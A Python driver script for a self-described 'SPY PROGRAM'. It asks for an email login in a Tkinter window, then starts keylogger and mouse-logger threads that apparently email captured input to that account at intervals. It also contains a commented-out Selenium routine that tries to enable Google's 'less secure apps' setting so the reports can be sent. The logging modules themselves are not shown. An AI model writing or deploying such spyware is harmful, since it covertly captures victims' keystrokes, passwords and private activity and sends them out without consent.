from keylogger import Keylogger
from mouselogger import MouseLogger
import selenium
from tkinter import *
from functools import partial
import re
import mouse,keyboard
SEND_REPORT_EVERY = 10


def allow_less_secure_apps():
    from selenium import webdriver
    driver = webdriver.Firefox()
    driver.get('https://myaccount.google.com/lesssecureapps')
    a = driver.find_elements_by_class_name("VfPpkd - scr2fc VfPpkd - scr2fc - OWXEXe - uqeOfd GZPvSe F5fPHf").click()
    print(driver.title)
    driver.quit()


def inputs():
    def validate_login(username, password, tkwindow):
        regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        if re.fullmatch(regex, username.get()):
            tkwindow.quit()
        else:
            print("Invalid Email")
        return

    tkWindow = Tk()
    tkWindow.title('SPY PROGRAM')
    usernameLabel = Label(tkWindow, text="User Name").grid(row=0, column=0)
    username = StringVar()
    usernameEntry = Entry(tkWindow, textvariable=username).grid(row=0, column=1)
    passwordLabel = Label(tkWindow, text="Password").grid(row=1, column=0)
    password = StringVar()
    passwordEntry = Entry(tkWindow, textvariable=password, show='*').grid(row=1, column=1)
    validateLogin = partial(validate_login, username, password, tkWindow)
    loginButton = Button(tkWindow, text="Login", command=validateLogin).grid(row=4, column=0)
    tkWindow.mainloop()
    return username.get(), password.get()


if __name__ == '__main__':
    # allow_less_secure_apps()
    username, password = inputs()
    from time import sleep
    keylog = Keylogger(interval=30, email_addr=username, email_pw=password)
    mouselog = MouseLogger(username, password)
    thread1 = keylog.start()
    thread2 = mouselog.start()
    thread1.start()
    thread2.start()
    thread2.join()
    thread1.join()
